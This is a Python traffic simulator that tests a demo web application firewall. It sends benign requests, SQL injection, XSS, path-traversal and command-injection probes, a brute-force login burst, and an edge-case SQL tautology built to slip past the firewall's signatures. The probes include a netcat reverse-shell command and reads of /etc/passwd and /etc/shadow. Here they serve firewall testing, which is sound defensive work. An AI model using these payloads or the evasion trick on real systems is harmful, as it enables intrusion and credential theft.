"""
simulator.py — generates realistic traffic against the running WAF.

Run:  python simulator.py   (with `python app.py` already up)

Traffic generated
  1. a batch of normal / harmless requests from several spoofed IPs
  2. malicious probes — at least one per attack class in rules.yaml
     (SQLi, XSS, LFI, traversal, command injection, suspicious encoding)
  3. a brute-force burst from a single IP to trip the rate limiter
  4. seeded edge cases for the report's false-positive / false-negative
     analysis

Every request carries:
  * X-Forwarded-For : spoofed client IP (so IP tables look realistic)
  * X-Sim-Id        : correlation id logged by the WAF, letting report.py
                      match each probe to its verdict exactly

Results are printed as a table AND written to simulator_run.json.
"""

import json
import sys
import time
import uuid
from collections import Counter

import requests

import config

BASE = f"{config.SIMULATOR_TARGET}/guard"
RUN_LOG = "simulator_run.json"

BANNER = """
============================================================
  SentinelShield Attack Simulator
  target: %s
============================================================
""" % config.SIMULATOR_TARGET


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def spoof(ip: str) -> dict:
    """Headers every simulated request carries."""
    return {
        "X-Forwarded-For": ip,
        "X-Sim-Id": uuid.uuid4().hex[:12],
        "User-Agent": "SentinelShield-Simulator/1.0",
    }


def send(method, path, *, ip, params=None, data=None, raw_query=None,
         expected, tag, note=""):
    """Fire one request, record expectation, return a result row.

    `params` is URL-encoded by requests (use for realistic traffic);
    `raw_query` is appended verbatim (use when the payload itself must
    contain live %xx sequences, e.g. ENC probes).
    """
    headers = spoof(ip)
    url = f"{BASE}/{path.lstrip('/')}"
    if raw_query:
        url += "?" + raw_query
    try:
        r = requests.request(method, url, params=params, data=data,
                             headers=headers, timeout=5, allow_redirects=False)
        # verdict: WAF tells us directly via header; forwarded 200/4xx from
        # the demo app means the request was allowed through.
        verdict = r.headers.get("X-WAF-Verdict", "ALLOWED" if r.status_code < 500 else "ERROR")
        rule = r.headers.get("X-WAF-Rule", "")
        category = ""
        if verdict in ("BLOCKED", "FLAGGED"):
            try:
                body = r.json()
                category = body.get("category", "")
                rule = body.get("rule", rule)
            except ValueError:
                category = "(block page)"
        ok = (verdict != "ALLOWED")
        if raw_query:
            shown = f"{path}?{raw_query}"
        else:
            shown = f"{path}{'?' + '&'.join(f'{k}={v}' for k, v in (params or {}).items()) if params else ''}"
        row = {
            "sim_id": headers["X-Sim-Id"],
            "method": method, "ip": ip,
            "target": shown,
            "tag": tag, "expected_malicious": expected,
            "verdict": verdict, "rule": rule, "category": category,
            "status": r.status_code, "note": note,
        }
    except requests.RequestException as exc:
        row = {
            "sim_id": headers["X-Sim-Id"], "method": method, "ip": ip,
            "target": f"{path} params={params}", "tag": tag,
            "expected_malicious": expected, "verdict": "ERROR",
            "rule": "", "category": str(exc)[:60], "status": 0, "note": note,
        }
    return row


# --------------------------------------------------------------------------- #
# traffic definitions
# --------------------------------------------------------------------------- #
def normal_traffic():
    """Harmless traffic — must ALL be allowed."""
    rows = []
    ips = ["10.0.0.5", "10.0.0.12", "192.168.1.40", "172.16.4.9", "10.0.0.5"]
    browsers = [
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2)"),
    ]
    pages = [("", "GET"), ("login", "GET"), ("search", "GET"),
             ("search", "GET"), ("view", "GET")]
    for i, (path, method) in enumerate(pages):
        ip = ips[i % len(ips)]
        params = {"q": "quarterly report"} if path == "search" else \
                {"file": "readme.txt"} if path == "view" else None
        rows.append(send("GET", path or "", ip=ip, params=params,
                         expected=False, tag="normal",
                         note=f"benign page load ({browsers[i % 2][:24]}…)"))
        time.sleep(0.05)
    # one legitimate login
    rows.append(send("POST", "login", ip="10.0.0.5",
                     data={"username": "intern", "password": "shield123"},
                     expected=False, tag="normal", note="legitimate login"))
    return rows


def malicious_traffic():
    """One+ probe per attack class — every one must be caught."""
    probes = [
        # ---- SQL Injection ------------------------------------------------
        ("GET", "search", {"q": "' UNION SELECT username,password FROM users--"},
         "103.44.55.1", True, "sqli", "UNION SELECT exfiltration"),
        ("GET", "login", {"next": "' OR 1=1--"},
         "103.44.55.1", True, "sqli", "auth tautology in redirect param"),
        ("POST", "login", {"username": "admin' OR '1'='1", "password": "x"},
         "45.132.88.7", True, "sqli", "tautology in login form"),

        # ---- XSS ----------------------------------------------------------
        ("GET", "search", {"q": "<script>document.cookie</script>"},
         "51.79.120.3", True, "xss", "classic script tag"),
        ("GET", "search", {"q": "<img src=x onerror=alert(1)>"},
         "51.79.120.3", True, "xss", "event-handler payload"),
        ("GET", "search", {"q": "javascript:alert(document.cookie)"},
         "51.79.120.3", True, "xss", "javascript: URI"),

        # ---- LFI / traversal ---------------------------------------------
        ("GET", "view", {"file": "../../../../etc/passwd"},
         "194.26.29.113", True, "lfi", "classic ../ traversal"),
        ("GET", "view", {"file": "..%2f..%2f..%2fetc%2fshadow"},
         "194.26.29.113", True, "lfi", "URL-encoded traversal"),
        ("GET", "view", {"file": "php://filter/convert.base64-encode/resource=index"},
         "194.26.29.113", True, "lfi", "php:// stream wrapper"),

        # ---- Command injection -------------------------------------------
        ("GET", "search", {"q": "; cat /etc/passwd"},
         "185.199.108.153", True, "cmdi", "semicolon + cat /etc/passwd"),
        ("GET", "search", {"q": "| whoami"},
         "185.199.108.153", True, "cmdi", "pipe + whoami"),
        ("GET", "search", {"q": "$(nc 10.10.10.5 4444 -e /bin/sh)"},
         "185.199.108.153", True, "cmdi", "command substitution + netcat shell"),

        # ---- suspicious encoding -----------------------------------------
        ("GET", "search",
         {"q": "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E"},
         "91.203.145.6", True, "encoding", "double-encoded XSS (decoded then caught)"),
        # dense %xx run of non-unreserved bytes — requests preserves these,
        # so the raw run reaches the WAF and only ENC-001 can flag it,
        # proving the "suspicious encoding itself" requirement
        # (string params -> sent as raw, un-re-encoded query)
        ("GET", "search", "q=%01%02%03%04%05%06%07%08%09%0a%0b%0c",
         "91.203.145.7", True, "encoding", "dense URL-encoded run (ENC-001)"),
    ]
    rows = []
    for method, path, params, ip, expected, tag, note in probes:
        raw = params if isinstance(params, str) else None
        norm = params if not isinstance(params, str) else None
        rows.append(send(method, path, ip=ip, raw_query=raw,
                         params=norm if method == "GET" else None,
                         data=norm if method == "POST" else None,
                         expected=expected, tag=tag, note=note))
        time.sleep(0.05)
    return rows


def brute_force_burst():
    """35 rapid logins from one IP -> trips 20/10s rate limit."""
    rows = []
    attacker = "203.0.113.66"
    print(f"\n  [*] Brute-force burst: 35 POST /login from {attacker} "
          f"(limit {config.RATE_LIMIT_MAX_REQUESTS}/"
          f"{config.RATE_LIMIT_WINDOW_SEC}s)")
    for i in range(35):
        rows.append(send(
            "POST", "login", ip=attacker,
            data={"username": "admin", "password": f"Hacked{i}!"},
            expected=True, tag="bruteforce",
            note=f"password guess #{i+1}",
        ))
        # keep the burst inside one rate-limit window (10 s)
        if i % 10 == 9:
            time.sleep(1.0)
        else:
            time.sleep(0.15)
    return rows


def edge_cases():
    """
    Seeded edge cases the report analyses as FP / FN candidates.

    1. FALSE-POSITIVE candidate: a *legitimate* search phrase that happens
       to contain SQL keywords — signatures will (overzealously) block it.
    2. FALSE-NEGATIVE candidate: a heavily obfuscated payload (mixed
       separators + whitespace tricks) that current signatures miss.
    """
    rows = []
    # FP: innocent help-desk search
    rows.append(send("GET", "search",
                     params={"q": "how to drop table in sql tutorial"},
                     ip="10.0.0.77", expected=False, tag="edge_fp",
                     note="innocent search containing SQL keywords (expected FP)"))
    # FN: valid MySQL tautology with NO whitespace and NO comment characters
    # ('OR(1=1)AND'1'='1) — signatures require literal whitespace after OR
    # and a comment tail, so this executes in MySQL yet evades the rules
    # (expected FN)
    rows.append(send("GET", "search",
                     params={"q": "'OR(1=1)AND'1'='1"},
                     ip="198.51.100.9", expected=True, tag="edge_fn",
                     note="whitespace-free MySQL tautology — evades literal-whitespace signatures (expected FN)"))
    time.sleep(0.1)
    return rows


# --------------------------------------------------------------------------- #
# reporting
# --------------------------------------------------------------------------- #
def print_summary(rows):
    width = {"target": 52, "ip": 15, "tag": 11, "verdict": 9, "category": 26}
    head = f"{'TAG':<{width['tag']}} {'IP':<{width['ip']}} {'TARGET':<{width['target']}} {'VERDICT':<9} {'CATEGORY':<26} RULE"
    print("\n" + "=" * len(head))
    print("  RESULTS")
    print("=" * len(head))
    print(head)
    print("-" * len(head))
    for r in rows:
        tgt = r["target"][:width["target"] - 1]
        print(f"{r['tag']:<{width['tag']}} {r['ip']:<{width['ip']}} "
              f"{tgt:<{width['target']}} {r['verdict']:<9} "
              f"{r['category'][:26]:<26} {r['rule']}")

    # per-tag tallies
    print("\n" + "-" * len(head))
    stats = Counter()
    catch = Counter()
    for r in rows:
        stats[r["tag"]] += 1
        if r["expected_malicious"] and r["verdict"] in ("BLOCKED", "FLAGGED"):
            catch[r["tag"]] += 1
        if not r["expected_malicious"] and r["verdict"] in ("BLOCKED", "FLAGGED"):
            catch[r["tag"]] += 1  # counted as "surfaced" for review
    print("  SUMMARY")
    for tag in ["normal", "sqli", "xss", "lfi", "cmdi", "encoding",
                "bruteforce", "edge_fp", "edge_fn"]:
        if tag in stats:
            print(f"    {tag:<12} {catch[tag]:>2}/{stats[tag]:<2} detected-or-flagged "
                  f"({stats[tag]} sent)")

    blocked = sum(1 for r in rows if r["verdict"] == "BLOCKED")
    flagged = sum(1 for r in rows if r["verdict"] == "FLAGGED")
    allowed = sum(1 for r in rows if r["verdict"] == "ALLOWED")
    print(f"\n  TOTAL: {len(rows)} requests | {blocked} BLOCKED | "
          f"{flagged} FLAGGED | {allowed} ALLOWED")


def main():
    print(BANNER)
    # 1) is the WAF even up?
    try:
        requests.get(f"{config.SIMULATOR_TARGET}/health", timeout=3)
    except requests.RequestException:
        print("  [!] WAF not reachable — start it first:  python app.py")
        sys.exit(1)

    print("  [1/4] Sending normal traffic …")
    rows = normal_traffic()

    print("  [2/4] Sending malicious probes (1+ per attack class) …")
    rows += malicious_traffic()

    print("  [3/4] Launching brute-force burst …")
    rows += brute_force_burst()

    print("  [4/4] Seeding edge cases (FP / FN candidates) …")
    rows += edge_cases()

    time.sleep(0.5)
    print_summary(rows)

    with open(RUN_LOG, "w", encoding="utf-8") as fh:
        json.dump(rows, fh, indent=2)
    print(f"\n  [+] Run manifest written to {RUN_LOG} (used by report.py)")
    print("  [+] Open the dashboard: "
          f"{config.SIMULATOR_TARGET}/\n")


if __name__ == "__main__":
    main()
